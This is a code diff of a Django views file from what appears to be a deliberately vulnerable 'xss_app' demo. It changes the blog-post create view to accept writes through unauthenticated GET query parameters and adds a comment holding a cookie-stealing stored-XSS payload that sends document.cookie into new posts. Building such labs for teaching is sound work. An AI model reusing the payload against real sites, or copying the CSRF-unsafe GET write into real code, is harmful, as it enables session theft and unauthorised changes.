@@ -1,10 +1,11 @@
 from django.db import connection
 # from unittest import loader
 
-# from django.shortcuts import render, get_object_or_404
-# from django.http import HttpResponse, HttpResponseRedirect
+from django.shortcuts import render, get_object_or_404
+from django.http import HttpResponse, HttpResponseRedirect
 from django.urls import reverse
 from django.views import generic
+from django.core.mail import send_mail
 # from django.db.models import Q
 
 from .models import Blog
@@ -44,7 +45,7 @@ class SearchResultsView(generic.ListView):
             row_data = {
                 "id": row[0],
                 "headline": row[1],
-                "blog_post_text": row[2],
+                "content": row[2],
                 "author": row[3],
                 "pub_date": row[4]
             }
@@ -56,24 +57,20 @@ class SearchResultsView(generic.ListView):
         context['search_query'] = self.request.GET.get("q")
         return context
 
-# curl -X POST http://127.0.0.1:8000/xss_app/create/ \
-#      --cookie "csrftoken=1BgsUSfWMsFXkYI7uq72n6TSnkPLnXqS" \
-#      -d "csrfmiddlewaretoken=fwkdzB8T2ij0ijVv846Tms4xrvD9t7Xg6XqvjjdFEAONs7tssk3LzoNfEFiKGUdY" \
-#      -d "headline=YourHeadline" \
-#      -d "blog_post_text=YourBlogPostText" \
-# >    -d "author=hacker"
-class BlogPostCreateView(generic.CreateView):
-    model = Blog
-    template_name = "xss_app/create.html"
-    fields = ["headline", "blog_post_text"]
 
-    def form_valid(self, form):
-        if self.request.user.is_authenticated:
-            form.instance.author = self.request.user.username
+# <script>function callfunc() {fetch('http://127.0.0.1:8000/xss_app/create?headline=HACKED&content=' + document.cookie).then(response => response.text()).then(data => {console.log(data);}).catch(error => {console.error('Error:', error);});}</script><div onmouseover="callfunc()">You have been hacked</div>
+class BlogPostCreateView(generic.View):
+    def get(self, request, *args, **kwargs):
+        headline = request.GET.get('headline')
+        content = request.GET.get('content')
+
+        if headline and content:
+            author = request.user.username if request.user.is_authenticated else "Anonymous"
+            Blog.objects.create(headline=headline, content=content, author=author)
+            return HttpResponseRedirect(self.get_success_url())
         else:
-            form.instance.author = "Anonymous"
-        return super(BlogPostCreateView, self).form_valid(form)
+            # Render the form template if no data is provided
+            return render(request, "xss_app/create.html")
 
     def get_success_url(self):
-        url = reverse('xss_app:index') + '#blogposts'
-        return url
+        return reverse('xss_app:index') + '#blogposts'
